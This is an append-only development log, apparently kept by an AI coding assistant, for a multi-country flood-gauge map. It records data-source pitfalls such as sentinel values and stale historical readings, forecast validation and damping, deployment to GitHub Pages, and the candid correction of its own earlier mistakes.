# Progress log

Append-only. Newest entry at top. **Read this first when resuming a session.**
Purpose: survive a closed terminal or an expired token with zero context loss.

---

## Current state

**Four countries live: Thailand, United Kingdom, Netherlands, United States.**
**16,243 gauges** (US 11,483 · GB 3,326 · TH 1,116 · NL 318) plus **493 Thai
reservoirs**, all fetched live.

⚠️ **Thailand was showing ~308 rivers over their banks. The real number is 12.**
Fixed 2026-09-16, see the session entry: `min_bank: 0` is ThaiWater's "not published"
sentinel, not a bank at sea level. Anyone who saw the map before this fix saw a national
emergency that was not happening.
**251 tests.** Live: https://khunanon-chanasongkhram.github.io/Project_SeRAPHIM/

**Next action:** push. Pushing also triggers a deploy, which the site needs.

⚠️ **The CI test step could never have passed.** `unittest discover` dropped
namespace-package support in Python 3.11, and `workers/tests/` had no `__init__.py`, so
`python -m unittest discover -s tests` died with `ImportError: Start directory is not
importable` before running a single test. CI pins Python 3.12, so the **Tests** step
would have failed on the first push and the build job would never have reached deploy.
Fixed by adding `workers/tests/__init__.py`; 203 tests now run in 0.12 s.

**Open items**
- **UK EA recovered mid-session.** It 503'd for most of it (GB rode the fail-soft cache,
  which demonstrably worked), then came back: the final build fetched all four countries
  live. Expect it to flap again; the cache path is now proven on real data.
- **Live refresh cannot be end-to-end tested here.** There is no Node and no browser on
  this machine, so the new client JS is syntax-checked by `scripts/check_js.py` only.
  What *was* verified against live data is the part most likely to fail silently: the
  station ids the live parsers build match the published ones (TH 1117/1117, US 37/37
  in a test viewport). Open the map and toggle Live before trusting it.
- **Netherlands has no live refresh** and never can from a browser: Rijkswaterstaat
  sends no `Access-Control-Allow-Origin`. The UI says so instead of offering a dead toggle.
- **Terrain covers 220 of 1,121 Thai gauges**, and 0 of the 11,467 US / 318 NL gauges.
  Top up: `cd workers && python3 -m seraphim.cli terrain --budget 60`.
- **ThaiWater terms of use still unconfirmed.** Contact HII before promoting it anywhere.
- **US and NL licensing is clean**: NOAA is public domain, Rijkswaterstaat is Dutch open
  data. Both are attributed in the map credit line.

**Hosting:** GitHub Actions builds, GitHub Pages serves. No Cloudflare, no card, no
account except GitHub. The SOS component was removed before deploy and lives on the
`sos-component` branch.

### Phase status
| Phase | Name | Status |
|---|---|---|
| 0 | Foundation | ✅ deployed |
| 1 | Ingest + live map | ✅ deployed |
| 2 | Risk engine | ✅ deployed |
| 3 | Calm mode (tide/fishing) | ✅ deployed |
| 4 | Respond (SOS) | ❌ built, then removed before deploy (branch `sos-component`) |
| 5 | Terrain | ✅ built, 220/1,121 gauges profiled |
| 6 | Harden / scale | ✅ deployed |
| 7 | Global + multi-hazard | ✅ deployed, **4 countries** (TH, GB, NL, US) + GDACS |
| 7b | Live refresh | ✅ built, opt-in client-side, TH/GB/US (NL blocked by CORS) |

Beyond the plan: validation/backtesting, per-country data splitting, world radio,
rain radar, earthquakes, active fires, satellite imagery, TH/EN switch.

---

## 2026-09-16 - Session 19: the prediction was worse than doing nothing

He asked for bugs, UI, better fishing, longer tide, more weather, and prediction in hours
and weeks. The bug hunt found the headline feature was actively harmful.

**Straight-line extrapolation had NEGATIVE skill.** The validation table had been
printing it for sessions and I had read it as "weak at long leads":

    lead   skill vs persistence
     1 h   +12%
     2 h    -3%
     3 h    -4%
     6 h   -72%
    12 h   -48%

Negative skill means you would have done better predicting the level does not change.
The headline number, time-to-bank, was built on it.

**Fixed by letting the rate decay:** `d(L) = rate * tau * (1 - exp(-L/tau))`. Straight
line for short leads, flattening beyond. Tau was swept over the archive, not guessed:
every value from 2 to 24 h beat the straight line at every lead. Six hours chosen, best
on rivers that are actually moving and matching the regression window, so we trust a rate
about as far forward as we measured it backward.

Measured effect, same archive:

    lead   straight line   damped   persistence
     6 h      0.062 m      0.045 m     0.036 m
    12 h      0.080 m      0.054 m     0.055 m

Skill went from -72% to -26% at 6 h and from -48% to +2% at 12 h. Bank-call median
timing error fell from **5.80 h to 0.46 h**. The published report now carries a `linear`
column so this stays measured rather than asserted.

**The cost, stated plainly:** the model asymptotes, so it will not promise a river 4 m
below its bank and creeping up gets there. Bank calls fell from 616 to 90. Far fewer
warnings, far better ones. A warning whose timing is out by most of a day is not a
warning.

**A second bug in my own fix**, caught by a test I wrote for it: near the asymptote the
inverse blows up, solving to 208 hours for a gap 99.9% of the way to the ceiling. That is
arithmetic, not a forecast. Capped at 48 h.

**Weeks ahead** is a different model on a different source, because it has to be. GloFAS
gives 30 days of daily discharge with an ensemble spread. It is published as river
**flow, never a level**: converting discharge to metres needs a rating curve per gauge
that nobody publishes and our archive cannot fit. The outlook never raises a risk level
either, it earns a line of reasoning, and it hedges out loud when the ensemble disagrees
(measured max/min ratios of 15x at day 30 on real Thai points).

**Tide was capped at 3 days for no reason.** The marine API silently returns exactly 216
non-null hours whatever you ask for, so 9 days exist. Asking for 16 publishes a week of
nulls that look like a gap rather than a limit. The planner now covers **7 days**, a day
inside both the tide and weather horizons.

**More weather**, all on the 40-spot batch so it costs one call: gusts, wind direction,
cloud, rain, air temperature and a weather code, over 10 days. Pressure and wind still
feed the score; the rest is shown rather than scored, because it is what decides whether
to go at all. A planner that scores an hour 82 without mentioning the gale is not a
planner.

**UI, the things that were invisible**
- **Calm mode was reachable only through a link inside the disclaimer paragraph.** Now a
  button of its own.
- **Day buttons were `flex:1`**, which is survivable at 3 days and unusable at 7. Now a
  scroll-snapped row of real touch targets, each showing that day's peak score with a
  star on the best one, so "which day should I go" is answered by looking rather than by
  tapping through seven days.
- Spot picker had an empty label and looked like text. Now labelled and obvious.
- Station popups show the projected level at +1/3/6/12 h, and the weeks-ahead flow
  outlook, each labelled with what it is and is not.

**A cost I am not hiding.** `fishing.json` went from 41 KB to 211 KB gzipped: seven days
instead of three, with per-hour conditions. Rounding the conditions to what is readable
(nobody needs a wind bearing to a tenth of a degree) saved 16 KB; the rest is the
per-hour factor text, which the page actually uses for the chart tooltip and the table.
It is a deliberately opened page, not the map's critical path, so it is accepted rather
than solved. If it needs solving later, the move is to send factor codes and render the
text client-side.

**Still open**
- Bank-call hit rate is ~5% and the archive cannot properly judge it: median series span
  is 1.5 h, so most calls are never observable. That number needs days of cron, not a
  better model, before it means anything.
- Terrain still covers Thai gauges only.

251 tests.

---

## 2026-09-16 - Session 18: the sentinel that cried flood, and dams

He said Thailand looked critical on our map and did not match thaiwater.net, and asked
for reservoir levels. The first half turned out to be the worst bug this project has had.

**`min_bank: 0` does not mean the bank is at sea level. It means there is no bank level.**
318 of 1,118 Thai stations carry it. Taking it as a number meant every gauge above sea
level had "positive overtopping": a station reading 164.89 m MSL was published as 164.89 m
over its bank. **302 stations announced as overtopped for the offence of being inland.**

We showed ~308 Thai rivers over bank. **The true number is 12.** That is the most
dangerous direction to be wrong in, and it was live.

**The cross-check that was supposed to catch this made it worse.** Session 3 recorded
"sign agreement 1,121/1,121" against the source's own `diff_wl_bank_text` and treated
that as validation. It was circular: that field is computed from the same `min_bank`, so
the source makes the identical mistake, and the two wrong answers agreed perfectly. Its
`diff_wl_bank` for those rows is literally the water level, which should have been the
tell. **A cross-check against a field derived from the field you are validating proves
nothing**, and I recorded it as proof for three sessions.

The independent signal was there all along: the source **refuses to publish
`storage_percent` for all 318**, because it knows it has no usable bank. That is now the
cross-check, and it can actually disagree. Zero disagreements after the fix.

Two more things fell out of looking properly:
- **`left_bank`/`right_bank` are a real fallback.** 312 of the 318 publish them, in MSL,
  consistent with their levels (median freeboard 3.3 m). Only 6 end up with no threshold.
- **Impossible readings were being published as facts.** `วัดเสมาท่าค้อ` at -875.7 m MSL,
  and four stations at exactly -9.99 m, one of them 23.4 m below its own surveyed bed.
  Each produced a large fake freeboard, which reads as safe. Gated on Thai terrain
  (-20..2600 m) and on the station's own bed (2 m allowance). The separation is clean:
  sentinels sit 7.7-23.4 m below bed, the worst genuine one 1.84 m and the source marks
  it with a negative `storage_percent` on purpose.

**Dams, which he also asked for.** `analyst/dam`, found in thaiwater.net's own JS bundle
because **there is no dam route in the `public/` namespace at all** - every `public/dam*`
guess 404s. 493 reservoirs published: 50 large, 443 medium.

It has the same two diseases:
- **Zero is a sentinel again** (35 of 50 large dams report `dam_level: 0`).
- **It mixes history with today, exactly like the Dutch feed.** 448 medium-dam rows from
  the last day, then **nothing until a year out**, then 317 rows dated to the 1970 epoch
  and 76 from 2021. My first working version sorted fullest-first and put a reservoir
  **last read in 2021** at the top of the map, labelled as spilling today. Caught it only
  because the dates were printed next to the names in my own check output. 7-day gate.
- **`dam_storage_percent` is percent of USABLE capacity, so >100 is normal.** 59 dams are
  over 100%, max 136%. It means above normal full level and likely spilling, **not a dam
  failing**, and it is not the same quantity as the gauge feed's `storage_percent`. Every
  dam popup says so.

Dams are deliberately **not** modelled as gauges: no bank level, no time-to-bank, no risk
score. A reservoir is a store, not a channel. Own layer, own colours, own popup.

**Also fixed: deploys were invisible.** He pushed, the site deployed correctly, and he saw
no change. Pages serves `cache-control: max-age=600` and the registered service worker
re-served the previous worker script, which is subject to that same cache. The document
now revalidates on every request and the page calls `registration.update()`. Assets and
the offline fallback are unchanged.

**README** rewritten for a reader rather than as a build log, at his request: the two
"what I learned" sections are gone, their safety-relevant content kept as "What it will
not tell you".

231 tests.

---

## 2026-09-16 - Session 17: the test suite that never ran, then two more countries

He said the program still had an error, wanted real-time data, and wanted the
Netherlands and the USA. All three landed; the error was not where I expected.

**The error: 168 tests that could not be collected.** `python3 -m unittest discover -s
tests` failed with `ImportError: Start directory is not importable` before running
anything. Cause: unittest dropped implicit namespace-package discovery in Python 3.11,
and `workers/tests/` has no `__init__.py`. **CI pins 3.12 and gates the build on that
step**, so the first push would have failed the Tests step and never deployed. One empty
file fixed it. The lesson is that "168 tests pass" was never actually observed on this
machine, only believed.

**"Real-time", without breaking the thing that makes this free.** Reads are static files
on a CDN; that is the whole architecture. So live does not mean putting a server in
front of the map, it means the browser asking the agency directly, exactly as it already
does for rain radar. Our origin still serves nothing but files.

CORS probed on all four: **ThaiWater and NOAA reflect the origin, UK EA sends `*`, and
Rijkswaterstaat sends no CORS header at all.** So TH, GB and US refresh live; NL cannot
from a browser, and the UI says so rather than offering a toggle that does nothing.

**Opt-in, default off** — he chose this when I laid out the trade-off. Turning it on
points a visitor's browser and IP at a foreign government API and costs them ~300 KB
(TH) / ~89 KB (US continental) / ~357 KB (GB) per refresh. Nobody should pay either
cost without choosing to, and PDPA is in scope.

What a live reading may change is deliberately narrow: it replaces the level and
recomputes freeboard (just bank minus level, honest to derive client-side), and it may
**escalate** a gauge to 5, because 5 means "water is over the bank now", an observation.
It may **never de-escalate**, because the snapshot's score can rest on a forecast, a tide
window or a trend that one reading knows nothing about. The panel shows a live level
beside a score stamped with the build it came from, rather than blending them.

**The US publishes a flood stage, so it gets the full treatment.** This was the
interesting difference from the UK. `flood` in NOAA's `riv_gauges` layer is the level at
which water leaves the channel, the same kind of number as Thailand's `min_bank`, so US
gauges earn freeboard, time-to-bank and level 5, which UK gauges deliberately cannot.
**The risk engine needed no change for this**: its caps key on whether a threshold
exists, not on which country a gauge is in. That is the Phase 0 seam paying out twice.

Cross-checked before trusting it: **6,797 US gauges, 100.00% sign agreement** between
our computed freeboard and NWS's own flood category, including all 10 then over flood
stage. Same discipline as the ThaiWater check in Session 3.

**Extremes checked, not clipped.** `MCCI2` reads -65.5 m and looked like a parse error;
it is Chicago's Deep Tunnel, ~300 ft underground. The 2,654 m readings are Wyoming
mountain reservoirs. Both real.

**The Netherlands hands back readings from 1740.** `OphalenLaatsteWaarnemingen` means
"the latest value of every series", not "current readings": of 2,244 series the oldest
"latest" is dated **1740-01-01** and the median is ~27 years old. RWS keeps historical
series in the same endpoint as live telemetry, distinguished only by timestamp.
Unfiltered, that puts 286-year-old marks on a live flood map, each looking like an
ordinary reading. A hard 24 h recency gate drops them. **After the gate: 318 locations,
median age 22 minutes** — the freshest source in the project.

Also: the old host is **decommissioned** (301 to a migration page that 404s), so this is
DDAPI 2.0; levels are in **centimetres**; and there are **four datums** again, with TAW
(Belgian, ~2.33 m below NAP) marked `local` rather than offset on an unverified constant.

**A plausibility gate that nearly deleted real data.** Dutch values reach 11,968 cm NAP,
which looks absurd in a famously flat country. `epen.geul.cottessen` gauges the Geul in
South Limburg, where the valley floor genuinely sits above 100 m. The gate is set
against Dutch terrain (-7 m to 322 m), not against the stereotype. I nearly shipped the
stereotype.

**The quota bomb the USA set off, and the better answer.** 11,467 American gauges took
the shared 0.2 degree forecast grid from 1,029 cells to **7,284**, about **36,000
Open-Meteo location-calls a day against a 10,000 allowance**. Coarsening the grid enough
to fit meant degrading Thailand and the UK to pay for the US.

The real answer was that Open-Meteo is the *downgrade* for America. NOAA publishes a
**per-gauge 24-hour river stage forecast** on layer 1 of the same service we already
call. So US gauges leave the shared grid entirely and use it instead: **two calls
regardless of gauge count**. Grid back to ~644 cells, and 2,299 US gauges now carry an
official hydrological forecast rather than a rainfall proxy over a 22 km cell. The
forecast can escalate to 4 and is capped below 5, for the same reason the tide bump is.

**Timestamps verified, not assumed**, twice. Neither `obstime` nor `fcsttime` carries an
offset. Both cross-checked against the NWPS API's explicit `validTime`: AACS2 reads
`2026-09-16 00:15:00` here and `...T00:15:00Z` there; ABBG1's forecast matches to the
value. Reading them as local would have shifted every US reading by up to 10 hours.

**A bug my own new tests caught.** The forecast scoring I added to `risk.py` referenced
`st.bank_msl`, but `assess()` names it `state.station`. It imported fine and the build
before the edit was green, so only the tests found it. Worth noting because the previous
two sessions both lost time to edits that silently did nothing.

**A second user-visible bug, found while checking the build was clean.** Every snapshot
was publishing `health: fail`, and the only failing check was `nasa_firms`. The fire
layer is optional and has no API key here, but `fetch_fires` returns `ok=False` for
"no key configured", which the health roll-up counted as a source failure. Consequence:
**the "data may be out of date" banner would have been pinned on permanently**, on a site
whose whole discipline is that the banner means something. A warning that is always
showing is one nobody reads on the day it matters.

Fixed with a distinction the model was missing: `SourceHealth.optional` separates
"absent because nobody configured it" from "broken". The optional one is still *named* in
the health detail, it just does not condemn the snapshot. A key that is present but
rejected still fails, because that is something going wrong.

**Payload, the same problem the second country caused.** Adding the US took a country
file to 834 KB gzipped. Fixed the same way Phase 7 fixed it: stop shipping fields that
say nothing. Null properties are dropped, and `name_en` goes when it just repeats `name`
(true for every US and Dutch gauge). US 834 -> 689 KB, TH 125 -> 116 KB, NL 14.3 -> 11.4 KB.
The trim keeps four station properties even when null, because the MapLibre paint
expressions read them and a null where a style wants a boolean takes the layer down.
There is a test asserting exactly those four survive, and writing it caught me listing
four more that belong to the province, quake, event and terrain layers instead.

**Not done / limits**
- No browser and no Node here, so the live JS is syntax-checked only. Station-id matching
  *was* verified against live data (TH 1117/1117, US 37/37) because that is the part that
  fails silently. **Open the map and toggle Live before trusting it.**
- Terrain still covers only Thai gauges: 220 of 1,117, and none of the 11,476 US or
  318 NL gauges.
- Time-to-bank now produces values again (`soonest to bank: 2.1 h`) once the archive had
  enough recent history; it was empty earlier in the session purely from the cron gap.

**Two follow-ups he asked for at the end.**
- **README "Status" no longer mentions SOS.** It was describing a feature that was
  removed and is not done, which read as if the project shipped something it does not.
  It now lists what is actually built, and notes that terrain covers Thai gauges only.
- **Removed the SAT/MAP flip button** from the bottom-right of the map. Basemap switching
  is unchanged and still in the layers panel (satellite / dark / light / OSM), so this
  removed a control, not a capability. Its two now-unused i18n keys went with it, from
  both languages, so TH/EN stay in step: 111 keys -> 109.

212 tests.

---

## 2026-09-15 - Session 16: Phase 5, terrain. Two wrong versions before the right one.

He asked directly after I had twice argued against it, so I built it. It turned out to be
feasible in a way I had not considered, and the interesting work was in refusing to claim
more than the data supports.

**The unlock: Open-Meteo has an elevation API.** 100 points per call, keyless. That means
**no DEM download and no raster library**, which matters because this machine has no
numpy, no rasterio, no GDAL and no pip, and a 30 m DEM for Thailand is about 2.5 GB.
Terrain is static, so it is sampled once and committed like the province outlines.

**Version 1, wrong.** Subtract DEM elevation from water level to get depth. Tested on four
over-bank stations: +1.7, **-3.7**, **-2.3**, -0.7 m. Two claim the river flows several
metres underground. Cause is resolution, not datum: a 90 m cell at a canal gate holds the
embankment, not the water.

**Version 2, also wrong.** Use the gauge as a relative reference. Sampling one Samut
Prakan gate returned every point within a kilometre sitting 1 to 7 m BELOW the gauge,
because the canal is embanked above a delta. Subtracting there turns a 0.4 m overtopping
into a claim of **3.4 m of water**. Overtopping fills land at a rate set by volume and
time; this has neither.

**Version 3, shipped.** Relative height, and **no depth claim at all**. Points more than
1 m below the gauge, shown only where the channel is actually spilling. Says WHERE water
would go, never HOW DEEP. There is a test that asserts no `depth_m` field exists, so the
rejected version cannot come back.

**Rate limits shaped the build.** The elevation service 429s under load, so four gauges
ride per call (25 points each, 100 per call) and topping up is a separate deliberate
command rather than part of the build. 220 of 1,121 gauges profiled, worst-risk first, so
a partial dataset is still useful. 2,025 low-ground points published, 29 KB gzipped.

**A resilience gap found by accident.** The UK API returned a 500 mid-session and the
build cheerfully published a Thailand-only site. For 15 minutes British readers would have
had nothing rather than something slightly old. Added per-country fail-soft: last known
good is cached and republished, flagged `stale` with its timestamp, expiring after 24 h so
yesterday's rivers are never shown as today's. Could not demonstrate it live because the
UK stayed down, so it is covered by tests instead.

168 tests.

---

## 2026-09-15 - Session 15: Phase 7. A second country, and what it exposed.

**Added the UK Environment Agency: 3,327 gauges, keyless, two bulk calls.** Total now
4,448 across two countries, built in 13s. This was the test of the SourceAdapter seam
from Phase 0, and it held: nothing had to be unpicked.

**The assumption it exposed.** Thailand publishes a bank level. **The UK does not**, it
publishes `typicalRangeHigh`, the top of a normal operating range. Treating those as the
same would have had the map announcing thousands of British rivers had burst their banks
whenever they ran high. UK stations now get a separate weaker signal, are capped at
level 3, and get **no time-to-bank**, because you cannot forecast reaching a threshold
nobody published. Verified on live data: 0 UK stations at level 4+, 0 with a TTB.

**Four datums in one feed.** 1,596 mASD, 1,318 m, 1,097 mAOD, 88 mBDAT, plus stray mm,
deg_C and m3/s that are not levels. Mixing mASD with mAOD puts gauges tens of metres out
with nothing surfacing. Added `Station.datum`; UK levels are `local` and only ever
compared with thresholds from the same station.

**Two quota/payload problems the second country created, both fixed**
1. **Forecasts would have needed ~22,000 Open-Meteo calls/day against a 10,000 limit.**
   Fixed by fetching on a 0.2 degree grid instead of per gauge: 4,448 gauges collapse to
   1,029 cells, about 5,100 calls/day. Rainfall and a 5 km discharge model do not vary
   meaningfully inside a 22 km cell.
2. **A map visit jumped from 183 KB to 437 KB**, because every visitor was downloading
   every country. Fixed by splitting station and area files per country with an
   `index.json`: Thai visit 242 KB, UK 276 KB, and **adding a third country now costs
   existing readers nothing**.

**Also:** GDACS global events layer (100 live events), a TH/GB/World view switcher, and
country is now part of the area rollup key so a Thai amphoe cannot merge with a British
catchment.

**Two process notes.**
- A `str.replace` silently did nothing again, same root cause as last session: em dashes
  still in the Python sources while I had only cleaned the .md files. This time the
  assertion I added caught it immediately. Then cleaned all 79 from the Python sources so
  it cannot recur.
- One of my new tests was wrong, not the code: I asserted three gauges 100 m apart land
  in one grid cell, but they straddled a cell boundary. Rewrote it to assert the property
  that actually matters, the aggregate reduction.

149 tests.

---

## 2026-09-15 - Session 14: validation. The predictions are now measured.

He chose validation over terrain. Right call: nothing in the project checked whether its
headline number was true.

**Built `seraphim/validate.py`.** Replays the archive, makes predictions using only data
that existed at the time, compares to what happened. Runs every build in 0.2s, publishes
`validation.json`, headline into `meta.json`, shown in the UI beside the prediction.

**The result, on rivers that are actually moving: +35 to +40% skill against persistence**,
typical error about 9 cm at 3 h lead. Across ALL rivers it is negative beyond 1 h, because
on a flat river persistence is exactly right and extrapolating a small noisy trend only
adds error. Time-to-bank already refuses to fire below 1 cm/hr, so it lives entirely in the
regime where the forecast has skill. Both numbers are published; neither is hidden.

**A bug the process caught in itself.** The first version matched predictions to the
nearest observation within 30 min. Numbers looked plausible, were not: 738 of the real
observation gaps are exactly 180 minutes, so origin+3h always landed on a reading and
origin+2h never did, scoring zero. Each lead was measured on a different population of
stations, making them incomparable. Fixed by interpolating the observed series to the exact
target time. **The first version of a measurement can be wrong in a way that looks like a
result.**

**A real defect found and fixed: the confidence tiers were not ordered.** `poor` predicted
better than `fair`. Cause was a selection effect, flat rivers scoring low R2 because there
is no signal to fit, then being trivially easy to predict. Added a `steady` tier, which
pulled out 1,284 flat cases; the moving tiers now order correctly by p90
(good 0.157 < fair 0.239 < poor 0.260).

**A process mistake worth remembering.** My first attempt at the `steady` edit silently did
nothing: the docstring in `history.py` still contained an em dash (I had only cleaned the
.md files) so the replace pattern never matched, and I reported success. Caught it only
because the measurement did not change. **Assert that a replacement matched.**

**Bank warnings: 7 of 11 came true, median timing error 3.06 h.** Sample far too small to
mean anything; published anyway rather than waiting for a flattering number.

Docs: `docs/VALIDATION.md`, plus a "Does it work?" section in the README with the real
figures including the unflattering ones. 131 tests.

---

## 2026-09-15 - Session 13: more layers, radio, and credit where it is due

He asked for: satellite/normal switching, tick boxes for layers, weather, Esri + OSM
stack, USGS earthquakes, geolocated world radio with an analog tuner, an Active Fires
API, and credit to gods-eye-view for the ideas.

**Probed everything first.**
- RainViewer: 13 global radar frames, keyless. Animated.
- USGS all_day: 199 quakes in the test run, keyless.
- Radio Browser: 800 returned, **693 usable** after filtering to geolocated AND https.
  An http stream on an https page is blocked as mixed content, so an unfiltered list
  would be full of play buttons that silently do nothing.
- OSM tiles: fine, usage policy noted.
- **NASA GIBS fires: gave up after real effort.** The thermal anomaly layers are vector
  tiles, not PNG, which explains the first 404s. Pulled the exact ResourceURL template
  out of its WMTS capabilities rather than guessing further, and it still 404s at every
  zoom, date and tile tried, including over Central Africa and the Amazon in September
  where fires definitely exist. Switched to FIRMS, which needs a free key.

**Fires and quakes are fetched in the build, not the browser.** That keeps the FIRMS key
in CI and off every visitor's machine, and the layers work offline. Radar and radio have
to be client side, since one is tiles and the other is audio the user picks.

**Layer toggles are now actual tick boxes**, because that is what he asked for and a
checkbox explains itself. Optional layers hide entirely when their data is absent rather
than offering a toggle that does nothing.

**Basemap flip is a button on the map**, not buried in the drawer. One tap, satellite to
street map and back.

**The radio tuner** orders stations by distance from wherever you are looking, so sweeping
the dial walks outward from the middle of the screen instead of down a list. Drag or tap,
and the map pins are clickable.

**Credited gods-eye-view properly** in the README, the attribution control and the source
comments. The radio tuner, earthquakes, fires and the Esri+OSM stack are its ideas, and it
found several of these APIs first. No code shared, but the README says plainly it would
look different without it.

**Scope note, said once and not laboured:** the radio has nothing to do with floods. It is
in because this is his stress-relief project and it is fun. Worth remembering if the flood
side ever needs to be taken seriously by anyone else.

---

## 2026-09-15 - Session 12: UI rebuild (satellite, i18n, mobile, province risk)

He deployed, looked at it on a phone, and said the UI was too big to see the map. Also
wanted a TH/EN switch, satellite imagery, a gods-eye-view look, real-time data, cameras,
and areas shaded by flood risk rather than only dots.

**Probed before promising anything**
- ✅ **Esri World Imagery** raster tiles, no key, plus a separate labels overlay (satellite
  alone has no place names).
- ✅ **Thai province outlines**, 77 polygons, 167 KB, MIT repo.
- ❌ **CCTV: nothing public.** Every ThaiWater camera path 404s except `shared/cctv` which
  403s, so it exists behind auth. GISTDA's portal is a JS app whose API is not visible to
  a fetch. Told him plainly rather than half-building something; the layers panel says why.

**Province risk without hand-typing 77 names.** The outlines are in English, our gauges are
in Thai, so 0 names matched. Instead of a typed table, the mapping is derived from the data:
every gauge knows its Thai province and its coordinates, so the polygon containing the most
gauges claiming a province IS that province. 77/77 resolved in 13 ms, 5 by majority vote
across a border, all correct. Self-checking in a way a typed table is not, and the build
prints the counts.

**UI rebuilt.** Map fills the screen; everything else is a collapsible bottom sheet (a side
panel on desktop) and a layers drawer. Dark console look, satellite default, glow-plus-core
markers that stay readable on photography, slow pulse on the worst places. Full TH/EN
switch on both pages, remembered in localStorage, defaulting from browser language. Polls
for a new snapshot every 60 s and swaps the data in place without a reload.

**No JS engine on this machine, which is a real risk.** No Node, no pip, so the browser
would have been the first thing to execute 20 KB of hand-written inline script, and a stray
brace ships as a blank page. Wrote `scripts/check_js.py`: a scanner that tokenises strings,
template literals, comments and regex literals well enough to catch unbalanced brackets and
unterminated literals, plus an i18n check that both languages define the same keys and that
no `t()` call is undefined. **Verified the checker against four deliberately broken files**;
it caught 3, missed an unterminated template containing a substitution, so I fixed that gap
and it now catches all 4. Wired into CI. It also caught a loose regex in its own i18n check
that flagged `.get("data")` as a missing translation key.

**Bugs found and fixed in the new UI:** a stray `')` inside a `join()` separator that would
have rendered literal junk in the degraded banner, and a fragile `className.replace()` that
rebuilt a CSS class from a string.

---

## 2026-09-15 - Session 11: SOS component removed before deploy

**His call, and a good one.** Asked to remove SOS before deploying.

**Why it is right:** collecting location, phone number, health needs and vulnerability
from people in danger makes you responsible for that data and, worse, for the expectation
that somebody is reading it. A hobby project with nobody on call cannot honour either. An
unanswered request is worse than no form at all, because the person might have called 1784
instead. Removing it also drops PDPA obligations entirely, removes the only write path,
and removes the last reason to need a Cloudflare account.

**Preserved first:** branch `sos-component` created at the pre-removal commit, so the whole
thing is one `git checkout` away. Git history has it regardless.

**Removed:** `api/` (Worker, D1 schema, conformance suite), `web/sos.html`, `web/ops.html`,
`seraphim/sos.py`, `seraphim/devserver.py`, `seraphim/sos_seed.py`, `tests/test_sos.py`,
`deploy-api.yml`, `scripts/make_token.py`. 55 tests went with it (169 -> 114).

**Rewired what depended on it**
- `loadtest.py` imported the dev server for the write-path test. Rewritten to measure only
  the read path, which is all that is left. Map visit is **183 KB gzipped**.
- **CSP tightened**: `connect-src` drops `*.workers.dev`, so it is now `'self'` plus the
  basemap. Removing a feature genuinely shrank the attack surface.
- `config.js` loses `apiBase`; the workflow's generated version is now one line.
- `check_deploy.py` loses its `--api` half.
- `sw.js` caches two pages instead of four, and the offline fallback is the map.

**Docs:** DEPLOY.md halved (211 -> 105 lines), now three steps. SECURITY.md keeps all six
findings but records that F1, F2, F3, F4 and F6 are retired with the component, while F5
and F1's escaping discipline still apply, because the map renders upstream ThaiWater
strings. OPERATIONS.md folds the Worker capacity finding into a historical block. PLAN.md
section 6 keeps the full SOS design with a note explaining why it was pulled, so the
thinking survives if it ever moves somewhere properly staffed.

**Left the PROGRESS history alone.** It is an append-only record of what actually happened,
so earlier sessions still describe building SOS. That is correct.

---

## 2026-09-15 - Session 10: repo went public, hosting moved to GitHub Pages

**Why:** R2 asks for a credit card even on its free tier, despite Cloudflare's own page
saying otherwise. Verified before sending him into it. He made the repo public instead,
which unlocked a better option.

**Verified, not assumed**
- GitHub Pages' "10 builds per hour" limit **does not apply** to custom Actions workflows
  deploying an artifact, so a 15 minute cron is fine.
- **Cloudflare Workers and D1 need no card.** R2 was the only piece that did, so it is
  now gone entirely.
- Public repo means **unlimited Actions minutes**, so the cron went from */30 back to */15
  and the whole 2,000 minute budget worry disappears.

**What changed**
- `ingest.yml` now builds the site and the snapshots together and deploys both to GitHub
  Pages as one artifact. No R2, no secrets needed for the data path at all.
- **Same origin, so CORS is gone as a concept.** The snapshots live inside the same
  deployment as the pages, so there is no cross-origin fetch to configure or to fail
  silently in someone's browser. That was the single most likely way the old path broke.
- `config.js` is now **generated** by the workflow rather than hand-edited, with `apiBase`
  from the repo variable `SERAPHIM_API_BASE`.
- **The CSP had to move into the documents.** GitHub Pages cannot send custom headers, so
  `web/_headers` is ignored there and the Phase 6 defence-in-depth would have silently
  vanished on deploy. Added as `<meta http-equiv>` to all four pages, and tested both that
  it exists and that it does not block the basemap, MapLibre's blob workers or the API.
  `frame-ancestors` cannot be set this way, which is the one thing lost.
- Simulated the exact deployed layout locally and served it: pages at root, data at
  `./data/out`, 1,121 stations and 45 time-to-bank values all resolving.

**Capacity correction.** The read path is no longer unmetered. GitHub Pages has a 100 GB
per month soft limit: provincial event ~19 GB fits, regional ~86 GB is close, national
~310 GB goes over by 3x. GitHub throttles rather than bills. Fix if it ever matters is
Cloudflare in front, no code change.

---

## 2026-09-15, Session 9: deployment path (found and fixed a production-breaking gap)

**Done, 167 tests passing. `docs/DEPLOY.md` written.**

**The gap that mattered.** GitHub runners are ephemeral and `data/` is gitignored, so
every ingest run would have started with an **empty archive**. The risk engine fits
trends over our own archived history, so no trend would ever span the 45-minute minimum
and **time-to-bank, the headline feature of the whole project, would never have
appeared in production at all.** It works locally only because the archive accumulates
on this machine. Fixed by extending the `actions/cache` entry to cover `data/archive`
alongside `data/cache`, plus `--archive-keep-hours 48` and a `prune_archive()` that
bounds the cache (it parses the filename rather than trusting mtime, which a cache
restore resets, tested, because a bug there deletes history).

**Three smaller wiring gaps, all closed**
- Every page hardcoded `../data/out` and `http://127.0.0.1:8788`; in production they
  would 404. Added `web/config.js`, one file, two values, with the relative paths kept
  as the local-dev fallback so `python3 -m http.server` still works unchanged.
- The CSP `connect-src` did not allow R2, so fetches would have been blocked **with no
  visible error**. Added `*.r2.dev`; `config.js` marked `no-cache` so changing an
  endpoint is not defeated by a stale cache.
- The R2 upload guessed content types: `.geojson` uploads as `application/octet-stream`,
  which blocks Cloudflare's in-transit compression and turns a 130 KB payload into
  1.2 MB on the wire. Now set explicitly.

**Removed the biggest obstacle for this machine:** no Node here, so the Worker is
deployed from CI via `deploy-api.yml` (manual trigger, with an optional schema apply).
Nothing needs installing locally.

**`scripts/make_token.py`** mints responder tokens, shows the raw token once, stores
only its SHA-256, prints the INSERT and the revoke statement. Verified round-trip
against the real auth path: the minted token authenticates, the raw value is nowhere in
the database, a wrong token is rejected, and the Worker hashes identically.

**Flagged honestly in the guide:** time-to-bank stays empty for the first ~1-2 h by
design; the Actions minute budget only holds while each run finishes under 60 s (rounded
up, 1,440 runs/month against 2,000) with `*/45` as the fallback; R2.dev is
development-grade; a national-scale event still needs the $5/month Workers plan.

---

## 2026-09-15, Session 8: Phase 3 built (calm mode, solunar & fishing)

